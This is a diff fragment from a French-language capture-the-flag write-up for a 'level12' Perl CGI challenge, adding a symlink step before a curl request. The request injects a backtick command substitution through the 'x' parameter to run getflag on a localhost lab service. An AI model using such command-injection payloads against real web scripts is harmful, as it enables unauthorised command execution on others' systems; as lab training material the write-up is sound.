@@ -26,6 +26,8 @@ Le script Perl utilise la fonction suivante :
 Pour exécuter la commande `getflag`, il suffit d’envoyer une requête HTTP contenant une injection via le paramètre `x` :
 
 ```shell
+ln -s /bin/getflag /tmp/GETFLAG
+
 curl 'http://localhost:4646/level12.pl?x="%60/*/getflag>%262%60"'
 ```
 
